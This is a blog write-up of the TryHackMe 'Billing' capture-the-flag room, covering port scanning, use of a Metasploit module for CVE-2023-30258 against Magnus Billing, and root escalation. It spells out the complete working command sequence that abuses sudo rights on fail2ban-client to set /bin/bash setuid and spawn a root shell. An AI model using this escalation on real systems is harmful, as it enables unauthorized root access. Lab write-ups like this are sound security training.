---
title: Write-up — Billing
date: 2025-07-16 10:00:00 AM
categories: [Write-up, Try Hack Me]
tags: [Try Hack Me, Write-up, ctf]
image: 'assets/img/articles/Billing.png'
description: "Explore my step-by-step guide to the TryHackMe Billing room. Learn how to perform reconnaissance with RustScan and Nmap, exploit web app vulnerabilities, and escalate privileges using Fail2Ban. Perfect for cybersecurity enthusiasts and professionals."
---

> Walkthrough of room Billing from TryHackMe :
> https://tryhackme.com/room/billing

This room is designed to teach you about billing systems and how to exploit them. It covers various aspects of billing, including vulnerabilities, exploitation techniques, and privilege exploitation.

---

## Recon

We will start by some recon...

![](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExaG14ejdmY3dhd283Nm1obGswNGFuZDZvYmxndno5NXE5NXkzaWFmNiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/i9cngh3Kw09GxlsrFP/giphy.gif)

```bash
$ rustscan -a $TARGET        
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/hisoka/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.127.112:22
Open 10.10.127.112:80
Open 10.10.127.112:3306
Open 10.10.127.112:5038

...

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63
5038/tcp open  unknown syn-ack ttl 63
```

We need to uncover the unknown service.

```bash
$ nmap -sC -sV $TARGET -p5038
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 17:15 CEST
Nmap scan report for billing.thm (10.10.127.112)
Host is up (0.14s latency).

PORT     STATE SERVICE  VERSION
5038/tcp open  asterisk Asterisk Call Manager 2.10.6

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
```

![You said asterix](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeXU1eTFkMHB4bDRtbHc4OXlueXhhYnFodTRyNGN4OXozczE0MDhubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/1Md9azxcgIyQ/giphy.gif)
_You said Asterix!!!_

So we have 4 services running:

| Port | Service  | Purpose  |
| ---- | -------- | -------- |
| 22   | ssh      |          |
| 80   | http     | Web      |
| 3306 | mysql    | Database |
| 5038 | asterisk | VoIP     |

Let's check the web page. It seems, we have a web application running on the server.

![Login page](assets/img/2025-07-16-THM-Billing/magnus-login-page.png){: w="600"}

The web page url contains the term *mbilling* (`/mbilling`). Probably link to a payment feature or something like that.
A quick search on Google help me to discover the name of the web app called **Magnus Billing** (same logo, use Asterisk can't be wrong).

![](assets/img/2025-07-16-THM-Billing/mbilling-google.png){: w="600"}

A great new is we have a cve (**CVE-2023-30258**) for our web app.

![](assets/img/2025-07-16-THM-Billing/exploit-db.png){: w="600"}

![](assets/img/2025-07-16-THM-Billing/metasploit-magnus-search.png){: w="600"}

And it's also available on metasploit!!!

![](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExa2Q0ZTZkZmlwMDZiZXZlNXU1Y2M3dW8wYWcwZDZuZzk1b2pqem95eCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/BYul6RujgoRCryuCdL/giphy.gif)

A little config on the exploit to make it work.
![](assets/img/2025-07-16-THM-Billing/meterpreter-session.png){: w="600"}

## Initial access

```bash
$ whoami
whoami
asterisk

$ ls /home
ls /home
debian	magnus	ssm-user

$ ls /home/magnus
ls /home/magnus
Desktop    Downloads  Pictures	Templates  user.txt
Documents  Music      Public	Videos

$ cat /home/magnus/user.txt
cat /home/magnus/user.txt
THM{********************************}
```

And voila!

![](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeXA2Z210MXB4bzBsODVwNmxreXYzNWQzaW10MXR1ODA5eWpuZDZhYSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/kxUhZ0TY46X1Dk48ru/giphy.gif)

## Privilege escalation

```bash
$ sudo -l
sudo -l
Matching Defaults entries for asterisk on ip-10-10-127-112:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-10-127-112:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

That means we can execute **`fail2ban-client`** with **sudo** rights.

Let's explain few things about **`fail2ban`**. Fail2Ban is an open-source intrusion prevention software framework designed to protect computer servers from brute-force attacks and other automated threats. Its primary purpose is to enhance the security of a system by monitoring log files for suspicious activity and **taking automated actions** to mitigate potential threats. For example, if a suspicious IP tries to connect to ssh server by brute-forcing the password, fail2ban can block the IP based on a criteria (like 10 connexion attempts).
So we can abuse `fail2ban-client` by setting an evil automated actions.

```bash
$ sudo /usr/bin/fail2ban-client status
sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:	8
`- Jail list:	ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd

$ sudo /usr/bin/fail2ban-client set sshd addaction evil
sudo /usr/bin/fail2ban-client set sshd addaction evil
evil

$ sudo /usr/bin/fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"
sudo /usr/bin/fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"
chmod +s /bin/bash

$ sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.4
sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.4

$ /bin/bash -p
/bin/bash -p

bash-5.2# whoami
whoami
root
```

**Explanation**

- *Listing Jails*: The `status` command lists all active jails managed by Fail2Ban.
- *Adding an Action*: The `addaction` command adds a new action to the specified jail.
- *Setting the Payload*: The `actionban` command sets the script or command to be executed when an IP is banned.
- *Triggering the Payload*: The `banip` command triggers the `actionban` script, executing your payload with elevated privileges.
- `chmod +s /bin/bash`: sets the setuid bit on the Bash executable, allowing users to run it with the permissions of its owner, typically root.
- `/bin/bash -p`: to start a Bash shell with root privileges. The `-p` option ensures that the shell retains the elevated privileges.

```bash
bash-5.2$ whoami
whoami
root

bash-5.2$ ls /root
ls /root
filename  passwordMysql.log  root.txt

bash-5.2$ cat /root/root.txt
cat /root/root.txt
THM{********************************}
```

![](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExazBncDNpcTIxaTQ0N3E4Njhjb2NhZWQwdXhxOGxqamdhbmdocTJyeSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/STrEzUEFPWLsY/giphy.gif)

All flags down, mission passed.

Be proud of what you’ve accomplished.

![](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExejBueW15czhhbm82bGZydWlmbjc2ZHJxdHZ0eHE3MjAwNDhjZWh5OSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/Ju7l5y9osyymQ/giphy.gif)

See you soon!

> “Cybersecurity is a continuous cycle of protection, detection, response, and recovery.” — Chris Painter

## Comments
<script src="https://giscus.app/client.js"
        data-repo="Deomorphisme/Deomorphisme.github.io"
        data-repo-id="R_kgDONEIr-Q"
        data-category="General"
        data-category-id="DIC_kwDONEIr-c4CjomU"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="preferred_color_scheme"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>
